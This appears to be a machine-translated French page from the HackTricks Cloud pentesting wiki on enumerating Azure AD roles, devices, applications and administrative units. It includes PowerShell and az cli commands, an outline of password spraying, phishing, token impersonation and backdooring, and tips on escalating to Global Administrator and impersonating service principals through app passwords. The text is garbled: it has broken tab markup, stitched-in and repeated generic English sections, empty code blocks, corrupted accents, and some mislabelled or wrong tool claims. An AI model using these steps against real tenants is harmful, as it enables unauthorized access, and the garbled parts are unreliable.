## Azure AD Enumeration

### User Enumeration

User enumeration can be performed through the Azure AD login interface. By entering a valid username and observing the response, an attacker can determine if the username is valid or not. This can be automated using tools like `enum4linux`, `ldapsearch`, or custom scripts.

### Group Enumeration

Group enumeration involves identifying Azure AD groups and their members. This can be done using tools like `Azure AD PowerShell module`, `Microsoft Graph API`, or by querying the Azure AD Graph API directly.

### Application Enumeration

Application enumeration focuses on identifying applications registered in Azure AD. This can be achieved by using tools like `Azure AD PowerShell module`, `Microsoft Graph API`, or by querying the Azure AD Graph API directly.

### Device Enumeration

Device enumeration involves identifying devices registered in Azure AD. Tools like `Azure AD PowerShell module`, `Microsoft Graph API`, or querying the Azure AD Graph API can be used to enumerate devices.

### Service Principal Enumeration

Service principals represent the application in Azure AD. Enumeration of service principals can be done using tools like `Azure AD PowerShell module`, `Microsoft Graph API`, or by querying the Azure AD Graph API directly.

### Role Enumeration

Role enumeration involves identifying roles assigned within Azure AD. This can be achieved using tools like `Azure AD PowerShell module`, `Microsoft Graph API`, or by querying the Azure AD Graph API directly.

### Policy Enumeration

Policy enumeration focuses on identifying policies configured in Azure AD. Tools like `Azure AD PowerShell module`, `Microsoft Graph API`, or querying the Azure AD Graph API can be used to enumerate policies.

### Tenant Enumeration

Tenant enumeration involves gathering information about the Azure AD tenant. This can be done using tools like `Azure AD PowerShell module`, `Microsoft Graph API`, or by querying the Azure AD Graph API directly.

### Risk Enumeration

Risk enumeration involves identifying and assessing risks within Azure AD. Tools like `Azure AD PowerShell module`, `Microsoft Graph API`, or querying the Azure AD Graph API can be used to enumerate risks.

{% endtab %}
```powershell
# Get all available role templates
Get-AzureADDirectoryroleTemplate
# Get enabled roles (Assigned roles)
Get-AzureADDirectoryRole
Get-AzureADDirectoryRole -ObjectId <roleID> #Get info about the role
# Get custom roles - use AzureAdPreview
Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
# Users assigned a role (Global Administrator)
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
Get-AzureADDirectoryRole -ObjectId <id> | fl
# Roles of the Administrative Unit (who has permissions over the administrative unit and its members)
Get-AzureADMSScopedRoleMembership -Id <id> | fl *
```
{% endtab %}

{% tab title="Az PowerShell" %} 

### Gestion des r√¥les Azure AD

#### Installation du module Az PowerShell

```powershell
Install-Module -Name Az -AllowClobber -Scope CurrentUser
```

#### Connexion √† Azure AD

```powershell
Connect-AzAccount
```

#### Afficher les r√¥les disponibles

```powershell
Get-AzRoleDefinition
```

#### Cr√©er un nouveau r√¥le

```powershell
$role = Get-AzRoleDefinition "Owner"
$role.Id = $null
$role.Name = "Custom Role"
$role.Description = "Can manage all resources"
New-AzRoleDefinition -Role $role
```

#### Assigner un r√¥le √† un utilisateur

```powershell
New-AzRoleAssignment -ObjectId <user-object-id> -RoleDefinitionName "Custom Role" -Scope "/subscriptions/<subscription-id>"
```

#### Supprimer un r√¥le

```powershell
Remove-AzRoleDefinition -RoleDefinitionName "Custom Role"
```

{% endtab %}
```powershell
# Get role assignments on the subscription
Get-AzRoleDefinition
# Get Role definition
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
# Get roles of a user or resource
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
Get-AzRoleAssignment -Scope /subscriptions/<subscription-id>/resourceGroups/<res_group_name>/providers/Microsoft.Compute/virtualMachines/<vm_name>
```
{% endtab %}

{% tab title="Brut" %}
```powershell
# Get permissions over a resource using ARM directly
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
### Appareils

{% tabs %}
{% tab title="az cli" %}
```bash
# If you know how to do this send a PR!
```
{% endtab %}

{% tab title="Azure AD" %}

## Azure AD Enumeration

### User Enumeration

To enumerate users in Azure AD, you can use tools like **Azure AD Connect** or **Azure AD Graph API**. These tools can help you gather information about users, such as usernames, email addresses, and group memberships.

### Group Enumeration

For enumerating groups in Azure AD, you can use tools like **Azure AD Graph Explorer** or **Azure AD PowerShell** module. These tools allow you to list all the groups in Azure AD and gather information about group members.

### Device Enumeration

To enumerate devices in Azure AD, you can use tools like **Azure AD PowerShell** module or **Microsoft Graph API**. These tools can provide you with information about devices registered in Azure AD, such as device names, types, and registration dates.

### Application Enumeration

For enumerating applications in Azure AD, you can use tools like **Azure Portal** or **Azure AD PowerShell** module. These tools allow you to view all the applications registered in Azure AD and gather information about application owners and permissions.

{% endtab %}
```powershell
# Enumerate Devices
Get-AzureADDevice -All $true | fl *
# List all the active devices (and not the stale devices)
Get-AzureADDevice -All $true | ?{$_.ApproximateLastLogonTimeStamp -ne $null}
# Get owners of all devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredOwner -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
# Registred users of all the devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredUser -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
# Get dives managed using Intune
Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"}
# Get devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Get Administrative Units of a device
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -ObjectId $_.ObjectId | where {$_.ObjectId -eq $deviceObjId} }
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
Si un appareil (VM) est **joint √† AzureAD**, les utilisateurs d'AzureAD pourront **se connecter**.\
De plus, si l'utilisateur connect√© est **Propri√©taire** de l'appareil, il sera **administrateur local**.
{% endhint %}

### Applications

{% hint style="info" %}
Les **Applications** sont des **Enregistrements d'application** dans le portail (pas des Applications d'entreprise).\
Mais chaque Enregistrement d'application va cr√©er une **Application d'entreprise** (**Principal de service**) avec le m√™me nom.\
De plus, si l'Application est une **Application multi-locataire**, **une autre** Application d'entreprise (**Principal de service**) sera cr√©√©e dans **ce locataire** avec le m√™me nom.
{% endhint %}

Lorsqu'une Application est g√©n√©r√©e, 2 types de permissions sont accord√©s :

* **Permissions** accord√©es au **Principal de service**
* **Permissions** que l'**application** peut avoir et utiliser **au nom de l'utilisateur**.
```bash
# List Apps
az ad app list
az ad app list --query "[].[displayName]" -o table
# Get info of 1 App
az ad app show --id 00000000-0000-0000-0000-000000000000
# Search App by string
az ad app list --query "[?contains(displayName,'app')].displayName"
# Get the owner of an application
az ad app owner list --id <id> --query "[].[displayName]" -o table
# List all the apps with an application password
az ad app list --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad app list --query "[?keyCredentials != null].displayName"
```
{% endtab %}

{% tab title="Azure AD" %}

## Azure AD

### Enumeration

1. **User Enumeration**: 
   - Utilize the Graph API to gather information about users, groups, and roles within the Azure AD tenant.
   - Enumerate users through the Azure AD login interface.

2. **Group Enumeration**:
   - Enumerate groups within the Azure AD tenant to understand the group membership and their associated permissions.

3. **Application Enumeration**:
   - Identify applications registered in Azure AD to discover potential points of attack.

### Exploitation

1. **Password Spraying**:
   - Perform password spraying attacks against the Azure AD authentication endpoint to avoid account lockouts.

2. **Phishing**:
   - Conduct phishing campaigns to steal user credentials and gain unauthorized access to Azure AD resources.

3. **Brute Force Attacks**:
   - Launch brute force attacks against the Azure AD authentication endpoint to crack weak passwords.

### Post-Exploitation

1. **Token Impersonation**:
   - Obtain and abuse tokens to impersonate users and access resources within Azure AD.

2. **Backdooring**:
   - Create backdoors in Azure AD configurations to maintain persistent access to the environment.

3. **Data Exfiltration**:
   - Extract sensitive data from Azure AD using various techniques such as querying the Graph API.

### Mitigation

1. **Multi-Factor Authentication (MFA)**:
   - Enforce MFA for all users to add an extra layer of security to Azure AD accounts.

2. **Regular Security Assessments**:
   - Conduct regular security assessments and audits to identify and address vulnerabilities in Azure AD configurations.

3. **Monitoring and Logging**:
   - Implement robust monitoring and logging mechanisms to detect and respond to suspicious activities in Azure AD.

{% endtab %}
```powershell
# List all registered applications
Get-AzureADApplication -All $true
# Get details of an application
Get-AzureADApplication -ObjectId <id>  | fl *
# List all the apps with an application password
Get-AzureADApplication -All $true | %{if(Get-AzureADApplicationPasswordCredential -ObjectID $_.ObjectID){$_}}
# Get owner of an application
Get-AzureADApplication -ObjectId <id> | Get-AzureADApplicationOwner |fl *
```
{% endtab %}

{% tab title="Az PowerShell" %} 

### Gestion des groupes Azure AD

#### Recherche de groupes Azure AD

Pour rechercher des groupes Azure AD, vous pouvez utiliser la commande suivante :

```plaintext
Get-AzADGroup -DisplayName "nom_du_groupe"
```

Assurez-vous de remplacer `"nom_du_groupe"` par le nom r√©el du groupe que vous recherchez.

#### Cr√©ation d'un nouveau groupe Azure AD

Pour cr√©er un nouveau groupe Azure AD, vous pouvez utiliser la commande suivante :

```plaintext
New-AzADGroup -DisplayName "nom_du_groupe" -MailNickname "alias_email" -MailEnabled $true
```

Assurez-vous de remplacer `"nom_du_groupe"` par le nom souhait√© pour le groupe et `"alias_email"` par l'alias email que vous souhaitez utiliser.

#### Suppression d'un groupe Azure AD

Pour supprimer un groupe Azure AD, vous pouvez utiliser la commande suivante :

```plaintext
Remove-AzADGroup -DisplayName "nom_du_groupe"
```

Assurez-vous de remplacer `"nom_du_groupe"` par le nom du groupe que vous souhaitez supprimer.

{% endtab %}
```powershell
# Get Apps
Get-AzADApplication
# Get details of one App
Get-AzADApplication -ObjectId <id>
# Get App searching by string
Get-AzADApplication | ?{$_.DisplayName -match "app"}
# Get Apps with password
Get-AzADAppCredential
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
Une application avec la permission **`AppRoleAssignment.ReadWrite`** peut **escalader en tant qu'administrateur global** en se donnant le r√¥le.\
Pour plus d'informations, [**consultez ceci**](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48).
{% endhint %}

{% hint style="info" %}
Une cha√Æne secr√®te que l'application utilise pour prouver son identit√© lors de la demande d'un jeton est le mot de passe de l'application.\
Ainsi, si vous trouvez ce **mot de passe**, vous pouvez acc√©der en tant que **principal de service** **√† l'int√©rieur** du **locataire**.\
Notez que ce mot de passe n'est visible que lorsqu'il est g√©n√©r√© (vous pourriez le changer mais vous ne pouvez pas le r√©cup√©rer).\
Le **propri√©taire** de l'**application** peut lui **ajouter un mot de passe** (pour pouvoir l'usurper).\
Les connexions en tant que ces principaux de service ne sont **pas marqu√©es comme risqu√©es** et elles **n'auront pas de MFA**.
{% endhint %}

### Diff√©rence entre Applications & (Applications d'entreprise ou Principaux de service)

Diff√©rence entre une application et un Principal de service dans Azure :

* **Applications/Enregistrements d'application** : Sont des applications qui existent dans votre Azure AD
* `(Get-AzureADApplication -filter "DisplayName eq 'testapp'")`
* **Principal de service/Applications d'entreprise** : Objets de s√©curit√© dans votre Azure AD qui peuvent avoir des **privil√®ges** dans le r√©pertoire Azure et sont li√©s soit √† votre application soit √† une application tierce
* `Get-AzureADServicePrincipal -filter "DisplayName eq 'testapp'")`
* Un administrateur peut avoir besoin d'approuver les autorisations donn√©es si elles sont tr√®s sensibles.

Une application peut √™tre ex√©cut√©e dans un **locataire tiers** et une fois que vous commencez √† l'utiliser et √† lui donner acc√®s, un **Principal de service/Application d'entreprise est cr√©√© dans votre locataire** pour lui donner acc√®s aux informations dont il a besoin :

### Unit√©s administratives

Elles sont utilis√©es pour une meilleure gestion des utilisateurs.

Les unit√©s administratives **restreignent les autorisations dans un r√¥le √† toute partie de votre organisation** que vous d√©finissez. Vous pourriez, par exemple, utiliser des unit√©s administratives pour d√©l√©guer le r√¥le [Administrateur du service d'assistance](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#helpdesk-administrator) √† des sp√©cialistes du support r√©gional, afin qu'ils puissent g√©rer les utilisateurs uniquement dans la r√©gion qu'ils supportent.

Par cons√©quent, vous pouvez attribuer des r√¥les √† l'unit√© administrative et ses membres auront ces r√¥les.
```
```
{% endtab %}

{% tab title="AzureAD" %}

## AzureAD Enumeration

### User Enumeration

User enumeration can be performed through the Azure AD login interface. By entering a valid username and observing the response, an attacker can determine if the username is valid or not. This can be automated using tools like `enum4linux`, `ldapsearch`, or custom scripts.

### Group Enumeration

Group enumeration involves identifying Azure AD groups and their members. This can be done through the Azure portal or by querying the Microsoft Graph API. Understanding group memberships can help attackers identify high-privileged users or potential lateral movement paths.

### Application Enumeration

Application enumeration focuses on identifying Azure AD applications and their configurations. Attackers can look for misconfigured applications that may expose sensitive data or provide unauthorized access. This can be done through the Azure portal or by interacting with the Azure AD Graph API.

### Device Enumeration

Device enumeration involves identifying devices registered in Azure AD. Attackers can gather information about devices, such as device names, types, and registration dates. This information can be useful for targeting specific devices or understanding the organization's device landscape.

### Service Principal Enumeration

Service principals represent applications or services in Azure AD. Enumeration of service principals can reveal details about the permissions and roles assigned to these entities. Attackers can leverage this information to identify potential misconfigurations or abuse permissions to escalate privileges.

### Domain Enumeration

Domain enumeration focuses on identifying custom domains associated with the Azure AD tenant. Attackers can use this information to craft targeted phishing attacks or identify additional entry points into the organization's environment.

### Policy Enumeration

Policy enumeration involves identifying Azure AD policies that govern user behavior and access control. Understanding these policies can help attackers bypass restrictions, escalate privileges, or tailor attacks to circumvent existing security measures.

### Risk Enumeration

Risk enumeration involves assessing the security risks associated with Azure AD configurations. Attackers can identify weak configurations, outdated settings, or misconfigurations that could be exploited to gain unauthorized access or disrupt operations.

{% endtab %}
```powershell
# Get Administrative Units
Get-AzureADMSAdministrativeUnit
Get-AzureADMSAdministrativeUnit -Id <id>
# Get ID of admin unit by string
$adminUnitObj = Get-AzureADMSAdministrativeUnit -Filter "displayname eq 'Test administrative unit 2'"
# List the users, groups, and devices affected by the administrative unit
Get-AzureADMSAdministrativeUnitMember -Id <id>
# Get the roles users have over the members of the AU
Get-AzureADMSScopedRoleMembership -Id <id> | fl #Get role ID and role members
```
{% endtab %}
{% endtabs %}

## Protection de l'identit√© Azure AD (AIP) <a href="#title-text" id="title-text"></a>

La Protection de l'identit√© Azure AD (AIP) est un service de s√©curit√© qui utilise **la d√©tection automatis√©e et la rem√©diation pour aider √† prot√©ger les identit√©s des utilisateurs dans Azure Active Directory contre les compromissions**. AIP surveille en continu et √©value le risque des connexions des utilisateurs et des configurations d'identit√©, **appliquant automatiquement des mesures de s√©curit√© appropri√©es**, telles que l'exigence d'une authentification multi-facteurs ou le blocage d'activit√©s potentiellement dangereuses. Cela aide les organisations √† pr√©venir les violations de s√©curit√© bas√©es sur l'identit√©.

Flux :

1. La Protection de l'identit√© Azure AD **surveille les activit√©s des utilisateurs** et collecte des donn√©es sur les **connexions, les √©v√©nements d'authentification** et d'autres activit√©s pertinentes des utilisateurs.
2. Le service utilise des **algorithmes d'apprentissage automatique** pour analyser ces donn√©es et d√©tecter les menaces potentielles √† la s√©curit√©.
3. La Protection de l'identit√© Azure AD **attribue un niveau de risque √† la menace** (par exemple, la connexion) et g√©n√®re une alerte si n√©cessaire pour effectuer une action automatique.

## Protection des mots de passe Azure AD (APP)

La Protection des mots de passe Azure AD (APP) est une fonctionnalit√© de s√©curit√© qui **aide √† pr√©venir les mots de passe faibles dans Azure Active Directory en imposant des politiques de mots de passe solides**. APP bloque les **mots de passe faibles couramment utilis√©s** et leurs variantes, r√©duisant ainsi le risque de violations li√©es aux mots de passe. Elle peut √™tre appliqu√©e √† la fois au niveau cloud et sur l'Active Directory sur site, am√©liorant la s√©curit√© globale des mots de passe dans toute l'organisation.

### R√©f√©rences

* [https://learn.microsoft.com/en-us/azure/active-directory/roles/administrative-units](https://learn.microsoft.com/en-us/azure/active-directory/roles/administrative-units)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
